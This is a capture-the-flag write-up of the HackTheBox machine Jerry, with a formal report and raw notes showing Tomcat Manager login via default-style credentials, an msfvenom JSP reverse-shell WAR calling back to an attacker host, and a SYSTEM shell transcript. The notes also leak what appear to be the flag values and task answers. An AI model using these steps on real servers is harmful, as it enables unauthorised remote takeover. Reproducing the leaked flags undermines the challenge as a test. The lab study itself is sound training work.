# HTB Room Report — Jerry (10.10.10.95)

**Target IP:** `10.10.10.95`  
**Room:** Jerry (Windows, Tomcat) — Easy difficulty  
**Author:** [your name / handle]  
**Date:** 2025-09-13

---

## 1. Summary / Objective
This document records the offensive engagement against the HackTheBox machine **Jerry**. The goal was to enumerate services, identify an exploitation path, obtain an interactive shell, and capture both user and root flags. The primary vulnerability chain involved Apache Tomcat manager access (WAR upload) to deploy a JSP reverse shell that yielded an `NT AUTHORITY\SYSTEM` shell on the Windows host.

**Outcome:** Full system compromise achieved; `user.txt` and `root.txt` recovered.

---

## 2. Reconnaissance & initial enumeration
Tools used: `rustscan`, `zenmap` (Nmap GUI), a personal `speedscan.py`, `curl`, a browser, `msfconsole` for convenience during exploitation, and `msfvenom` for payload generation.

**Observed service:** HTTP on port **8080** serving Apache Tomcat.

Basic steps & observations:
- Confirmed the web service at `http://10.10.10.95:8080`.
- Found Tomcat Manager application at `/manager/html` which requires authentication.
- Default creds did not work, but the 401 Unauthorized message hinted that credentials are stored in `conf/tomcat-users.xml` and even provided an example of `[REDACTED]` as a typical manager credential. Inspection revealed `[REDACTED]` / `[REDACTED]` worked.

---

## 3. Vulnerability & attack path overview
1. **Tomcat manager GUI** allows WAR file uploads and deployment.  
2. **Obtain manager credentials**: tomcat:s3cret (from configuration hint/inspection).  
3. **Create JSP reverse shell WAR** using `msfvenom` with `java/jsp_shell_reverse_tcp` payload.  
4. **Deploy WAR** through Manager GUI to `http://10.10.10.95:8080/portmortem/` (example).  
5. **Listen for reverse connection** using `nc -lvnp 4445` and receive a Windows shell.  
6. **Privilege level:** The shell returned `NT AUTHORITY\SYSTEM` (full system privileges).  
7. **Enumerate filesystem** and retrieve flags from `[REDACTED]` and `[REDACTED]`.

---

## 4. Reproducible commands & actions (red-team steps)

**Recon / discovery**
```bash
# quick TCP discovery (example)
rustscan -a 10.10.10.95 -r 1-65535
nmap -sV -p- 10.10.10.95
# or use zenmap GUI to visualize ports
```

**Check webapp**
```bash
# browse to the manager application
http://10.10.10.95:8080/manager/html
# use browser to view 401 page content for hints
```

**Generate WAR payload (on attacker machine)**
```bash
# create a JSP reverse shell WAR using msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=4445 -f war > portmortem.war
# Expected output: Payload size and final war size printed
```

**Start listener (attacker machine)**
```bash
nc -lvnp 4445
# or use msfconsole multi/handler configured for java/jsp_shell_reverse_tcp
```

**Upload & deploy WAR**
- Log into Tomcat Manager with `[REDACTED]` at `/manager/html`.  
- Use the "Upload WAR" or "Deploy" UI to upload `portmortem.war`.  
- Browse to `http://10.10.10.95:8080/portmortem/` (or the context path shown by Manager) to trigger the JSP and spawn the reverse shell.

**On listener, accept connection**
```
listening on [any] 4445 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
whoami
nt authority\system
```

**Post-exploitation enumeration & flags**
```powershell
# from the SYSTEM shell
dir C:\Users\Administrator\Desktop\flags /s
type C:\Users\Administrator\Desktop\flags\user.txt
type C:\Users\Administrator\Desktop\flags\root.txt
```

---

## 5. Findings & evidence
- **Open TCP port:** `8080` (HTTP/Tomcat).  
- **Web server product:** Apache Tomcat.  
- **Manager path:** `/manager/html` (Tomcat Web Application Manager).  
- **Working credentials:** `[REDACTED]` (username:password).  
- **Uploadable file type via Manager:** `.war` (WAR archive).  
- **Privilege after exploitation:** `NT AUTHORITY\SYSTEM` (highest Windows privilege).

**Captured flags:**  
- `user.txt`: `[REDACTED]`  
- `root.txt`: `[REDACTED]`

---

## 6. Answers to room tasks (explicit)
1. **Which TCP port is open on the remote host?** `8080`  
2. **Which web server is running on the remote host?** `Apache Tomcat`  
3. **Which relative path leads to the Web Application Manager?** `/manager/html`  
4. **Valid username:password for Tomcat Manager?** `[REDACTED]`  
5. **Which file type can be uploaded and deployed via Manager?** `WAR file`  
6. **User flag (user.txt)** `[REDACTED]`  
7. **Administrator flag (root.txt)** `[REDACTED]`

---

## 7. Remediation & Blue Team recommendations
This lab demonstrates the impact of misconfigured or exposed management interfaces and the danger of file upload/deploy features. Suggested mitigations:

**Immediate / short-term:**
- Restrict access to Tomcat Manager via IP allowlists or network ACLs (only trusted admin IPs).  
- Change default or weak credentials; ensure unique, strong admin passwords.  
- Disable the manager application in production unless explicitly required.  
- Remove anonymous access and disable upload/deploy features if not needed.

**Medium-term / hardening:**
- Enforce TLS/HTTPS for Tomcat management interfaces and remote administration.  
- Apply least-privilege: run Tomcat service under a dedicated low-privilege account, and ensure deployed webapps cannot execute system-level commands.  
- Use web application firewalls (WAF) and monitoring to detect unusual deploy/upload activity.  
- Perform scheduled vulnerability scans and pentests to catch exposures such as manager GUIs and default credentials.

**Long-term / process:**
- Configuration management and secret rotation policies to avoid default creds shipping in images.  
- Asset inventory of admin panels and apply access control policies centrally.  
- Developer training on safe usage of deployment features and avoid storing sensitive files in webroots.

---

## 8. Lessons learned & notes
- Tomcat Manager WAR upload is a straightforward exploitation path when credentials are known or discoverable.  
- The 401 page content sometimes leaks configuration hints — pay attention to web app error messages.  
- Confirm management interfaces are not exposed to attacker networks.  
- Practice attacker techniques and defensive remediations in lab images to understand impact and mitigation.

---

## 9. Artifacts / evidence to store securely
- `portmortem.war` — generated payload WAR file (attacker artifact)  
- `msfvenom` output logs / creation notes  
- Listener logs (`nc` session capture) and shell transcript  
- Copy of `user.txt` and `root.txt` contents (store in evidence repo)  

---

*End of Jerry HTB writeup.*

---
orginial notes:
<details>
 Jerry is an easy-difficulty Windows machine that showcases how to exploit Apache Tomcat, leading to an `NT Authority\SYSTEM` shell, thus fully compromising the target. 
 
 ip = “10.10.10.95”
 
 learned that under htb if we enable it under perfences we can see udner retired machines the related classes we can take in teh academy to learn, neat!
 
 utlized rustscan, my personal speedscan.py, and zenmap
 
 we see that we can go to the site with adding 8080 on the url so 10.10.10.95:8080
 
 we started metasploit framework and saw a vuln, but let's explore the website first
 
 we have a manager app on the site that requests a username nad password. the default creds didn't work
 
 when we cancel the login get a 401 authorized error:
 
 we see that we aren't authorized to view this page, and we can view the conf/tomcat-users.xml to let us do what we need for updates
 
 we see that user might be tomcat, and password of s3cret
 
 bing, we're in!
 
 the info on the 401 error is:
    
401 Unauthorized
        You are not authorized to view this page. If you have not changed     any configuration files, please examine the file     conf/tomcat-users.xml in your installation. That     file must contain the credentials to let you use this webapp.    
        For example, to add the manager-gui role to a user named     tomcat with a password of s3cret, add the following to the     config file listed above.    
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
        Note that for Tomcat 7 onwards, the roles required to use the manager     application were changed from the single manager role to the     following four roles. You will need to assign the role(s) required for     the functionality you wish to access.    
          • manager-gui - allows access to the HTML GUI and the status          pages
      • manager-script - allows access to the text interface and the          status pages
      • manager-jmx - allows access to the JMX proxy and the status          pages
      • manager-status - allows access to the status pages only
    
        The HTML interface is protected against CSRF but the text and JMX interfaces     are not. To maintain the CSRF protection:    
       ◇ Users with the manager-gui role should not be granted either        the manager-script or manager-jmx roles.
    ◇ If the text or jmx interfaces are accessed through a browser (e.g. for        testing since these interfaces are intended for tools not humans) then        the browser must be closed afterwards to terminate the session.
   
        For more information - please see the     Manager App HOW-TO.    
 
 
 we can upload a war file, so let's do some digging
 
 fter doing google searches and enumeration , I came to know that we can 
upload WAR files and also we can create a msf payload using msfvenom in 
WAR format
 
 MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.

googing says to use this code: msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.9 LPORT=4445 -f war > portmortem.war

we get: 
Payload size: 1094 bytes
Final size of war file: 1094 bytes

chatgpt tells us what each part means to clarify:

msfvenom
Metasploitâ€™s payload generator/encoder/packer utility. It creates payloads (shells/backdoors/etc.) in many formats.

-p java/jsp_shell_reverse_tcp
-p selects the payload. java/jsp_shell_reverse_tcp is a JSP reverse TCP payload — it generates a JSP file packaged inside a WAR that, when executed by a Java web server (Tomcat/etc.), will cause the target host to open a TCP connection back to your machine and give you a command shell.

• LHOST=10.10.14.9
 The local host IP for the reverse connection — i.e., the attacker/listener IP that the target should connect back to. Set this to your attacking machine’s reachable IP (here 10.10.14.9).

• LPORT=4445
 The local port the target will connect to on your machine. You must have a listener on this port to receive the session.

• -f war
 The output format. war tells msfvenom to produce a Java WAR (Web ARchive) file. A WAR bundles web resources (including JSPs) and can be deployed to Java web servers.

• > portmortem.war
 Shell redirection: write the msfvenom output to a file named portmortem.war. (> overwrites if the file exists; use >> to append.)

when we go to it's a blank page, but what if we use nc(netcat?) http://10.10.10.95:8080/portmortem/

and we refeshed and got it!

└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.95] 49193
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>

whoami
nt authority\system

full access baby!
 
 chatgpt wasn't useful, btu we learned that we can use dir /s flags to find a file. The /s lists every occurenace
 
 we find one in: 
 Users/Administrator/Desktop/flags
 
 we find 2 for the price of 1.txt
 
 we get:
 
 user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e



 
 task 1: Which TCP port is open on the remote host?
8080

task 2: Which web server is running on the remote host? Looking for two words.
Apache Tomcat

task 3: Which relative path on the webserver leads to the Web Application Manager?
/manager/html

task 4: What is the valid username and password combination for authenticating into the Tomcat Web Application Manager? Give the answer in the format of username:password
Tomcat / s3cret

task 5: Which file type can be uploaded and deployed on the server using the Tomcat Web Application Manager?
WAR file

task6: Submit the flag located on the user's desktop.

task7: Submit the flag located on the administrator's desktop.
</details>
